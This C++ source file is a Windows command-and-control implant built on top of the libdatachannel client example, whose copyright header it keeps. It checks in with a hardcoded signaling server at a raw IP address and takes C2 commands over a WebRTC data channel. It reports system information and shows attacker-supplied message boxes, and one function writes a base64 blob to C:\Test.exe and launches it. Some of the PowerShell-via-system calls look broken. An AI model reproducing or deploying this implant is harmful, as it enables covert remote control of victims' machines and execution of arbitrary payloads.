/*
 * libdatachannel client example
 * Copyright (c) 2019-2020 Paul-Louis Ageneau
 * Copyright (c) 2019 Murat Dogan
 * Copyright (c) 2020 Will Munn
 * Copyright (c) 2020 Nico Chatzi
 * Copyright (c) 2020 Lara Mackey
 * Copyright (c) 2020 Erik Cota-Robles
 *
 * This program is free software; you can redistribute it and/or
 * modify it under the terms of the GNU General Public License
 * as published by the Free Software Foundation; either version 2
 * of the License, or (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program; If not, see <http://www.gnu.org/licenses/>.
 */

#include "rtc/rtc.hpp"

#include "parse_cl.h"

#include <nlohmann/json.hpp>

#include <algorithm>
#include <future>
#include <iostream>
#include <memory>
#include <random>
#include <stdexcept>
#include <thread>
#include <unordered_map>

#include <windows.h>
#include <ShellAPI.h>


using namespace rtc;
using namespace std;
using namespace std::chrono_literals;

using json = nlohmann::json;

template <class T> weak_ptr<T> make_weak_ptr(shared_ptr<T> ptr) { return ptr; }

unordered_map<string, shared_ptr<PeerConnection>> peerConnectionMap;
unordered_map<string, shared_ptr<DataChannel>> dataChannelMap;

string localId;

shared_ptr<PeerConnection> createPeerConnection(const Configuration &config,
                                                weak_ptr<WebSocket> wws, string id);
string randomId(size_t length);


/***
* createFileFromBase | Creates a binary from a base64 string
***/
void createFileFromBase64String(string stringFile) {
	const char* secondCmd =
	    "[IO.File]::WriteAllBytes($FileName, [Convert]::FromBase64String($B64String))";

	std::string firstCmd = "$B64String = '" + stringFile + "'";
	std::system(firstCmd.c_str());

	std::system("$FileName = 'C:\Test.exe'");

	std::system(secondCmd);
	cout << "TEST COMPLETED**" << endl;
	ShellExecute(NULL, "open", "C:\Test.exe", NULL, NULL, SW_SHOWDEFAULT);
	cout << "TEST COMPLETED***" << endl;
}

/***
* getSystemInfo | Performs calls to WindowsAPI functions to retrieve hardware and software information
***/
SYSTEM_INFO getSystemInfo(string data) {
	SYSTEM_INFO siSysInfo;

   // Copy the hardware information to the SYSTEM_INFO structure. 
   GetSystemInfo(&siSysInfo); 
	   
   return siSysInfo;
}

/***
* Interprets messages from the C2 (Verify, Decrypt, Process) and creates an answer to send to the C2s
***/
string parseMessage(string message) {

	//Commands
	string cmd1 = "list-implants"; //Provides an updated version of implants and their respective information
	string cmd2 = "pop-up"; //Pops up a windows with the provided message (Testing purposes)
	string cmd3 = "system-info"; //Asks for system information 


	/***
	* list-implants | List the implants connected on the network.
	***/
	if (strncmp(message.c_str(), cmd1.c_str(), cmd1.size()) == 0) {
	
		string data = message.substr(message.find(":") + 1); //Parameter (Data for command)
		//TODO: Update arrays and save on to disk


	/***
	* pop-up | Pop a message box with the give message
	***/
	}else if(strncmp(message.c_str(), cmd2.c_str(), cmd2.size()) == 0) {
		string data = message.substr(message.find(":") + 1); 
		int msgboxID = MessageBox(NULL,data.c_str(),"Important Message",MB_ICONWARNING | MB_CANCELTRYCONTINUE | MB_DEFBUTTON2);


	/***
	* system-info | Returns basic system information
	***/
	}else if(strncmp(message.c_str(), cmd3.c_str(), cmd3.size()) == 0) {
		string data = message.substr(message.find(":") + 1); //Parameter

		SYSTEM_INFO sysInfo = getSystemInfo(data);
		auto oemId = std::to_string(sysInfo.dwOemId);
		auto processorNumber = std::to_string(sysInfo.dwNumberOfProcessors);
		auto pageSize = std::to_string(sysInfo.dwPageSize);
		auto processorType = std::to_string(sysInfo.dwProcessorType);
		auto activeProcessorMask = std::to_string(sysInfo.dwActiveProcessorMask);

		auto answer = oemId + ":" + processorNumber + ":" + pageSize + ":" + processorType + ":" + activeProcessorMask;
		return answer;
	} else
		cout << message << endl;

	return "Received Correctly";
}

int main(int argc, char **argv) try {
	Cmdline params(argc, argv);

	rtc::InitLogger(LogLevel::Info);
	Configuration config;
	// stunServer hardcodes
	string stunServer = "stun:stun.l.google.com:19302";
	string stunServer2 = "stun:stun2.l.google.com:19302";
	string signalServed = "ws://73.4.243.143:8000";
	string c2id = "6969";

	config.iceServers.emplace_back(stunServer);
	// local id generation
	localId = randomId(4);
	//make web socket
	auto ws = make_shared<WebSocket>();

	std::promise<void> wsPromise;
	auto wsFuture = wsPromise.get_future();

	//on open
	ws->onOpen([&wsPromise]() {
		wsPromise.set_value();
	});

	//on error thrown
	ws->onError([&wsPromise](string s) {
		wsPromise.set_exception(std::make_exception_ptr(std::runtime_error(s)));
	});

	//on websocket close
	ws->onClosed([]() { cout << "WebSocket closed" << endl; });

	//when message received
	ws->onMessage([&](variant<binary, string> data) {
		if (!holds_alternative<string>(data))
			return;

		json message = json::parse(get<string>(data));

		auto it = message.find("id");
		if (it == message.end())
			return;
		string id = it->get<string>();

		it = message.find("type");
		if (it == message.end())
			return;
		string type = it->get<string>();

		shared_ptr<PeerConnection> pc;
		if (auto jt = peerConnectionMap.find(id); jt != peerConnectionMap.end()) {
			pc = jt->second;
		} else if (type == "offer") {
			cout << "Answering to " + id << endl;
			pc = createPeerConnection(config, ws, id);
		} else {
			return;
		}

		if (type == "offer" || type == "answer") {
			auto sdp = message["description"].get<string>();
			pc->setRemoteDescription(Description(sdp, type));
		} else if (type == "candidate") {
			auto sdp = message["candidate"].get<string>();
			auto mid = message["mid"].get<string>();
			pc->addRemoteCandidate(Candidate(sdp, mid));
		}
	});

	//craft signal server w/ local id from hardcoded signal server
	const string url = signalServed + "/" + localId;
	ws->open(url);

	//waiting for signal connection
	wsFuture.get();

	/***
	* Implant check-in
	***/

	while (true) {


		string id;
		cout << "Press ENTER to Connect" << endl; //TODO - Remove this in the future
		cin >> id;
		cin.ignore();
		if (id.empty())
			break;
		if (id == localId)
			continue;

		//Create Connection
		auto pc = createPeerConnection(config, ws, c2id);

		//Create a data channel to initiate the process
		const string label = "c2-main";
		auto dc = pc->createDataChannel(label);

		//Create C2 Connection
		dc->onOpen([c2id, wdc = make_weak_ptr(dc)]() {
			cout << "DataChannel from " << c2id << " open" << endl;
			if (auto dc = wdc.lock()){
				dc->send("check-in " + localId); //Checks In with C2
			}
		});
		


		dc->onClosed([c2id]() { cout << "DataChannel from " << c2id << " closed" << endl; });

		//On received Message
		dc->onMessage([c2id, wdc = make_weak_ptr(dc)](variant<binary, string> data) {
			if (holds_alternative<string>(data)){

				//Interpret Messages (Verify, Decrypt, Interpret) 
				cout << "CONSUMING.." << endl;
				string answer = parseMessage(get<string>(data));
				if(auto dc = wdc.lock()){
					cout << "SENDING ANSWER TO C2" << endl;
					dc->send(answer);
				}
			}
			else
				cout << "Binary message from C2 received, size=" << get<binary>(data).size() << endl;
		});

		dataChannelMap.emplace(c2id, dc);
	}

	cout << "Cleaning up..." << endl;

	dataChannelMap.clear();
	peerConnectionMap.clear();
	return 0;

} catch (const std::exception &e) {
	std::cout << "Error: " << e.what() << std::endl;
	dataChannelMap.clear();
	peerConnectionMap.clear();
	return -1;
}

// Create and setup a PeerConnection
shared_ptr<PeerConnection> createPeerConnection(const Configuration &config,
                                                weak_ptr<WebSocket> wws, string id) {
	auto pc = make_shared<PeerConnection>(config);

	pc->onStateChange([](PeerConnection::State state) { cout << "State: " << state << endl; });

	pc->onGatheringStateChange(
	    [](PeerConnection::GatheringState state) { cout << "Gathering State: " << state << endl; });

	pc->onLocalDescription([wws, id](Description description) {
		json message = {
		    {"id", id}, {"type", description.typeString()}, {"description", string(description)}};

		if (auto ws = wws.lock())
			ws->send(message.dump());
	});

	pc->onLocalCandidate([wws, id](Candidate candidate) {
		json message = {{"id", id},
		                {"type", "candidate"},
		                {"candidate", string(candidate)},
		                {"mid", candidate.mid()}};

		if (auto ws = wws.lock())
			ws->send(message.dump());
	});

	pc->onDataChannel([id](shared_ptr<DataChannel> dc) {
		cout << "DataChannel from " << id << " received with label \"" << dc->label() << "\""
		     << endl;

		dc->onOpen([wdc = make_weak_ptr(dc)]() {
			if (auto dc = wdc.lock())
				dc->send("Hello from " + localId);
		});

		dc->onClosed([id]() { cout << "DataChannel from " << id << " closed" << endl; });

		dc->onMessage([id](variant<binary, string> data) {
			if (holds_alternative<string>(data))
				cout << "Message from " << id << " received: " << get<string>(data) << endl;
			else
				cout << "Binary message from " << id
				     << " received, size=" << get<binary>(data).size() << endl;
		});

		dataChannelMap.emplace(id, dc);
	});

	peerConnectionMap.emplace(id, pc);
	return pc;
};

// Helper function to generate a random ID thanks libchanneldata
string randomId(size_t length) {
	static const string characters(
	    "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz");
	string id(length, '0');
	default_random_engine rng(random_device{}());
	uniform_int_distribution<int> dist(0, int(characters.size() - 1));
	generate(id.begin(), id.end(), [&]() { return characters.at(dist(rng)); });
	return id;
}
